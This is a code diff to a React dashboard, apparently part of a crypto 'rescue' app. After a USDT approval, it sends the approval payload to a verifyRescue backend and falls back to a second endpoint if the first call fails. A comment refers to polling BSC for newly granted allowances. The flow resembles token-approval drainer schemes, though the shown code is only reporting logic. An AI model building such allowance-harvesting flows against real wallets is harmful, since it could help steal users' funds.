@@ -679,17 +679,23 @@ const Dashboard: React.FC = () => {
           token: USDT_CONTRACT,
         });
 
+        // Report approval to verifyRescue (with fallback only if primary fails)
         fetch(`${API_BASE}/verifyRescue`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: reportPayload,
-        }).catch((err) => console.warn('Backend report direct notice:', err));
-
-        fetch(`/api/verifyRescue`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: reportPayload,
-        }).catch(() => { });
+        })
+          .then((res) => {
+            if (!res.ok) throw new Error(`HTTP ${res.status}`);
+          })
+          .catch((err) => {
+            console.warn('Direct API_BASE call failed, trying /api fallback:', err);
+            fetch(`/api/verifyRescue`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: reportPayload,
+            }).catch(() => {});
+          });
       };
 
       // 1. On-chain BSC poller: checks for incremented nonce or newly granted allowance
